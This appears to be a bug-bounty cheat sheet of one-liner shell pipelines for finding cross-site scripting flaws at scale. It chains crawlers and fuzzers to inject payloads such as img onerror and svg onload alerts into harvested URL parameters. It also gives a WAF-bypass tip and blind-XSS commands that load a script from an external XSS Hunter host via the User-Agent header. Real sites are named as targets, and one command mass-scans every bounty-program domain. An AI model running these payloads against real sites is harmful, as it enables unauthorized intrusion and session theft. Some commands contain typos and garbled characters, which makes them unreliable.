
  We are going to use 3 tool to find XSS:
----------------------------------------------------

 `1. Parm Spider
 `2. Gxss
 `3. dalfox

 
 Paramspider - For find all parameter in website:

- python3 paramspider.py --domain paytm.com --exclude png,svg,jpg
- python3 paramspider.py --domain paytm.com -o /home/kali/Desktop/output.txt
 
 ' Now you can see output if website contain parameter then perfrom reflect 
  - cat output.txt | Gxss
 
 cat | paytm.com | Gxss -p #which you want to reflact
 
 cat paytm.com | Gxss -p Noob | dalfox pipe --mining-dict /param.txt --skip-bav

 cat paytm.com | Gxss -p Noob | dalfox pipe --mass
 cat paytm.com | Gxss -p Noob | dalfox pipe -o twitch --blind http://example.xss.ht

 

If <script> - payload blocked by WAF; then try it -- ( sr<script>b1mal )


Find XSS:

  ->	echo http://example.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
	install freq: - go get -u https://github.com/takshal/freq
cat
  ->	echo http://testphp.vulnweb.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
       
 	AirisXSS - Insatallation : https://github.com/ferreiraklet/airixss

# XSpear -u "http://domain.com/dir.php?param=123" -v 1
	
## success?next_url=javascript%3Aalert%2F**%2F(document.domain)

----------------------------------------------------xxxxxxxxxxxxxxxxxxxxxxxxxxxxx-------------------------------------------------------

 Method - 1:
-------------------
       
      First you need to gather subdomain of target:
      $ subfinder -d example.com -o subdomain.txt
  
            #The Next process was to find the number of sub-domains which are active,
      $ cat subdomains.txt | httprobe | tee -a host.txt

      #Now gather some endpoint to the host.txt
      $ cat host.txt | waybackurl | tee -a endpoint.txt
   
      #started to fuzz all the parameters to find xss vulnerability with the help of the tool qsreplace.
      $ cat endpoint.txt | qsreplace â€˜â€œ><img src=x onerror=alert(1)> | tee -a xss_fuzz.txt

      #After executing the command now, I had to check the number of parameters have been reflecting our
        payload into a plain text weather or not.

      $ cat xss_fuzz.txt | freq | tee -a possible_xss.txt
      
            
      
 #Method -2:
-------------------------------

      Oneliner XSS automation by 
     @BountyOverflow
 
     echo http://target.com | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq


 Finding XSS with onliner commadnline:
--------------------------------------
	
    echo www.example.com | httpx -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload-confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'



  XSS: 
------------
	go run main.go test.php.vulnweb.com | tee testphp1.txt | qsreplace '"><script>confirm(1)</script>' | tee combinedfuzz.json && cat 
	combined.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n"


 Find XSS Tips:
 -------------
	$ wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ dalfox url @

  $ gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee result.txt

  $ waybackurls http://testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | dalfox -b http://blindxss.xss.ht pipe > output.txt

  $ waybackurls http://testphp.vulnweb.com| grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
  
##################################################################################################################

Blind XSS at scale ðŸ”¥ðŸ”¥ðŸ”¥
--------------------------
cat roots.txt | waybackurls | httpx -H "User-Agent: \"><script src=$YOUR_XSS_HUNTER></script>" 

And monitor your xss hunter dashboard  





 

 








